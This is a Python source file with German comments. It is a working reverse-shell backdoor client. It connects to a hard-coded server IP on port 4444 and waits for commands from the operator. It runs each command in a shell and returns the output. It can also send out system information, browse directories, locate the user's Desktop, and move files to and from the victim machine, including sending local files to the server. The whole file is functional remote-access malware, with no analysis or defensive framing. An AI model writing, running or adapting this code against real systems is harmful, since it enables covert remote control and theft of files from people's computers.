import sys
import socket
import subprocess
import os
import platform

SERVER = "172.17.80.1"  # IP des Servers
PORT = 4444  # Port des Servers

s = socket.socket()
s.connect((SERVER, PORT))  # Verbindung zum Server herstellen
msg = s.recv(1024).decode()  # Empfang der Willkommensnachricht
print('[*] Server:', msg)

# Funktion für Systeminfo
def get_sysinfo():
    try:
        system_info = subprocess.check_output("systeminfo", shell=True, stderr=subprocess.STDOUT)
        # Versuchen, die Daten mit UTF-8 oder einer anderen Codierung zu dekodieren
        return system_info.decode('utf-8', errors='ignore').encode()
    except Exception as e:
        return f"Fehler bei der Systeminfo: {str(e)}".encode()

# Funktion für Verzeichnisinhalt (Directory Listing)
def list_directory(path='.'):
    try:
        files = os.listdir(path)
        return '\n'.join(files).encode()
    except Exception as e:
        return f"Fehler beim Abrufen des Verzeichnisinhalts: {str(e)}".encode()

# Funktion zum Wechseln in ein Verzeichnis
def change_directory(path):
    try:
        os.chdir(path)
        return f"[+] Verzeichnis gewechselt zu {os.getcwd()}".encode()
    except FileNotFoundError:
        return f"Fehler: Verzeichnis {path} nicht gefunden.".encode()
    except PermissionError:
        return f"Fehler: Keine Berechtigung für {path}.".encode()
    except Exception as e:
        return f"Fehler: {str(e)}".encode()

# Funktion zum Herunterladen von Dateien vom Server
def download_file(file_path):
    try:
        with open(file_path, "wb") as f:
            file_data = s.recv(1024)  # Empfang der Datei
            while file_data:
                f.write(file_data)
                file_data = s.recv(1024)
        return f"[+] Datei {file_path} erfolgreich heruntergeladen.".encode()
    except Exception as e:
        return f"Fehler beim Herunterladen der Datei: {str(e)}".encode()

# Funktion zum Hochladen von Dateien zum Server
def upload_file(file_path):
    try:
        if os.path.exists(file_path):
            with open(file_path, "rb") as f:
                file_data = f.read(1024)
                while file_data:
                    s.send(file_data)
                    file_data = f.read(1024)
            return f"[+] Datei {file_path} erfolgreich hochgeladen.".encode()
        else:
            return f"Fehler: Datei {file_path} existiert nicht.".encode()
    except Exception as e:
        return f"Fehler beim Hochladen der Datei: {str(e)}".encode()

# Funktion zur Befehlsausführung
def execute_command(cmd):
    try:
        result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
        return result
    except subprocess.CalledProcessError as e:
        return f"Fehler bei der Ausführung des Befehls: {e.output}".encode()
    except Exception as e:
        return f"Fehler: {str(e)}".encode()

# Funktion zum Ermitteln des Hostnamens
def get_hostname():
    return platform.node().encode()

# Funktion für den Desktop-Pfad des Benutzers
def get_desktop_path():
    desktop_path = os.path.join(os.environ["USERPROFILE"], "Desktop")
    return desktop_path

# Schleife zum Empfangen und Ausführen von Befehlen
while True:
    cmd = s.recv(1024).decode()  # Empfang des Befehls vom Server
    print(f'[+] Empfangen: {cmd}')

    if cmd.lower() in ['q', 'quit', 'x', 'exit']:  # Verbindung beenden
        break

    # Systeminfo-Befehl
    elif cmd.lower() == 'sysinfo':
        result = get_sysinfo()

    # Verzeichnisinhalt anzeigen
    elif cmd.lower().startswith('ls'):
        path = cmd[3:].strip() if len(cmd) > 2 else '.'
        result = list_directory(path)

    # In ein Verzeichnis wechseln
    elif cmd.lower().startswith('cd'):
        path = cmd[3:].strip()
        result = change_directory(path)

    # Zugriff auf den Desktop des Benutzers
    elif cmd.lower() == 'desktop':
        desktop_path = get_desktop_path()
        result = f"[+] Desktop-Verzeichnis ist: {desktop_path}".encode()

    # Datei herunterladen
    elif cmd.lower().startswith('download'):
        file_path = cmd[9:].strip()  # Datei-Pfad extrahieren
        result = download_file(file_path)

    # Datei hochladen
    elif cmd.lower().startswith('upload'):
        file_path = cmd[7:].strip()  # Datei-Pfad extrahieren
        result = upload_file(file_path)

    # Hostname des Systems anzeigen
    elif cmd.lower() == 'hostname':
        result = get_hostname()

    # Standardmäßig versuchen wir den Befehl auszuführen
    else:
        result = execute_command(cmd)

    # Wenn der Befehl keine Ausgabe hat, sende "Executed"
    if len(result) == 0:
        result = '[+] Befehl erfolgreich ausgeführt'.encode()

    s.send(result)  # Sende das Ergebnis zurück an den Server

s.close()  # Verbindung schließen